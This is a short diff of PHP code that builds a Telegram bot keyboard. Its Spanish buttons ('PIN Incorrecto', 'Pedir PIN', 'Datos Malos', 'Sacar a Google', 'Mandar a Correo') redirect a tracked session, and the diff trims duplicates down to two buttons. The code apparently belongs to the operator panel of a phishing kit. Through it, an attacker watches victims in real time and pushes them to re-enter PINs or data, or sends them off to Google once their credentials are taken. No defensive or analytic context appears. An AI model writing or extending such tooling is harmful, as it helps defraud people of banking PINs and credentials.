@@ -25,11 +25,7 @@ if (!empty($id_sesion)) {
                 'inline_keyboard' => [
                     [
                         ['text' => '⚠️ PIN Incorrecto', 'callback_data' => "redirigir|{$id_sesion}|pin_malo"],
-                        ['text' => '🚪 Sacar a Google', 'callback_data' => "redirigir|{$id_sesion}|sacar_google"],
-                        ['text' => '❌ Datos Malos', 'callback_data' => "redirigir|{$id_transmision}|datos_malos"],
-                        ['text' => '🔑 Pedir PIN', 'callback_data' => "redirigir|{$id_transmision}|pedir_pin"],
-                        ['text' => '📧 Mandar a Correo', 'callback_data' => "redirigir|{$id_sesion}|correo"],
-                        ['text' => '⚠️ PIN Incorrecto', 'callback_data' => "redirigir|{$id_sesion}|pin_malo"]                       
+                        ['text' => '🚪 Sacar a Google', 'callback_data' => "redirigir|{$id_sesion}|sacar_google"]                      
                     ]
                 ]
             ];
